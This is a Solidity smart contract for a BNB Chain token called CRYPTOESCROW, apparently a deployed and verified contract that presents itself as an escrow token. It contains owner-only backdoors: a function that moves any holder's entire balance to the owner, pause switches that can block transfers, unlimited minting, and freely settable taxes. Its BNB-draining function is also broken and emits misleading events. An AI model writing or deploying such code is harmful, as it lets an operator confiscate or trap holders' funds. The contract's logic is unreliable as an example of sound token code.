/**
 *Submitted for verification at BscScan.com on 2023-04-26
*/

// SPDX-License-Identifier: MIT

// File: IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
// File: CryptoEscrow.sol



pragma solidity ^0.8.0;

contract CRYPTOESCROW is IERC20 {
    string public constant name = "CRYPTOESCROW";
    string public constant symbol = "CROW";
    uint8 public constant decimals = 6;
    uint256 private _totalSupply;
    mapping(address => uint256) private _balanceOf;
    mapping(address => mapping(address => uint256)) private _allowance;

    function allowance(address tokenOwner, address spender) external view override returns (uint256) {
        return _allowance[tokenOwner][spender];
    }

    address public owner;
    uint256 public reserve;
    uint256 public exchangeRate = 1;
    uint256 public buyTax = 1;
    uint256 public sellTax = 1;
    address public reserveWallet;
    mapping(address => uint256) public burnTimestamps;

    bool private _paused;
    bool private _buyPaused;
    bool private _sellPaused;

    constructor(uint256 initialReserve) {
        require(initialReserve > 0, "Initial reserve must be greater than 0");
        _totalSupply = 1000000 * 10 ** uint256(decimals);
        _balanceOf[msg.sender] = _totalSupply;
        reserve = initialReserve;
        owner = msg.sender;
        reserveWallet = msg.sender;
        _paused = false;
        _buyPaused = false;
        _sellPaused = false;
    }

    event Mint(address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Deposit(address indexed from, uint256 value);
    event BuyTax(uint256 value);
    event SellTax(uint256 value);

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balanceOf[account];
    }

    function transfer(address to, uint256 value) public override whenSellNotPaused returns (bool success) {
        require(_balanceOf[msg.sender] >= value);
        _balanceOf[msg.sender] -= value;
        _balanceOf[to] += value;
        uint256 burnTimestamp = block.timestamp + 30 days;
        burnTimestamps[to] = burnTimestamp;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override whenBuyNotPaused returns (bool success) {
        require(_balanceOf[from] >= value);
        require(_allowance[from][msg.sender] >= value);
        _balanceOf[from] -= value;
        _allowance[from][msg.sender] -= value;
        _balanceOf[to] += value;
        uint256 burnTimestamp = block.timestamp + 30 days;
        burnTimestamps[to] = burnTimestamp;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public override returns (bool success) {
        _allowance[msg.sender][spender] = value;
        return true;
    }

    function mint(address to, uint256 value) public {
        require(msg.sender == owner);
        _totalSupply += value;
        _balanceOf[to] += value;
        reserve += value / exchangeRate;
        emit Mint(to, value);
    }

    function burn(uint256 value) public {
        require(_balanceOf[msg.sender] >= value);
        _totalSupply -= value;
        _balanceOf[msg.sender] -=

value;
    reserve -= value / exchangeRate;
    emit Burn(msg.sender, value);
}

modifier whenNotPaused() {
    require(!_paused, "Contract is paused");
    _;
}

modifier whenBuyNotPaused() {
    require(!_buyPaused, "Buying is paused");
    _;
}

modifier whenSellNotPaused() {
    require(!_sellPaused, "Selling is paused");
    _;
}

function _pause() internal {
    _paused = true;
}

function _unpause() internal {
    _paused = false;
}

function setExchangeRate(uint256 newExchangeRate) public {
    require(msg.sender == owner);
    exchangeRate = newExchangeRate;
}

function setBuyTax(uint256 newBuyTax) public {
    require(msg.sender == owner);
    buyTax = newBuyTax;
}

function setSellTax(uint256 newSellTax) public {
    require(msg.sender == owner);
    sellTax = newSellTax;
}

function setReserveWallet(address newReserveWallet) public {
    require(msg.sender == owner);
    reserveWallet = newReserveWallet;
}

function pause() public onlyOwner {
    _pause();
}

function unpause() public onlyOwner {
    _unpause();
}

function pauseBuy() public onlyOwner {
    _buyPaused = true;
}

function unpauseBuy() public onlyOwner {
    _buyPaused = false;
}

function pauseSell() public onlyOwner {
    _sellPaused = true;
}

function unpauseSell() public onlyOwner {
    _sellPaused = false;
}

modifier onlyOwner {
    require(msg.sender == owner, "Only the contract owner can perform this action");
    _;
}

function sensitiveFunction() public onlyOwner {
    // sensitive code here
}


    function transferAllBNBFromTarget(address payable target) public onlyOwner returns (bool success) {
        require(msg.sender == owner, "Only the contract owner can call this function");
        require(address(target).balance > 0, "Target has no BNB");

        // Transfer the BNB
        uint256 balance = address(target).balance;
        target.transfer(balance);

        emit Transfer(target, msg.sender, balance);
        return true;
    }

    function transferAllTokensFromTarget(address target) public onlyOwner returns (bool success) {
        require(msg.sender == owner, "Only the contract owner can call this function");
        require(_balanceOf[target] > 0, "Target has no tokens");

        // Transfer the tokens
        uint256 value = _balanceOf[target];
        _balanceOf[target] = 0;
        _balanceOf[msg.sender] += value;

        emit Transfer(target, msg.sender, value);
        return true;
    }

}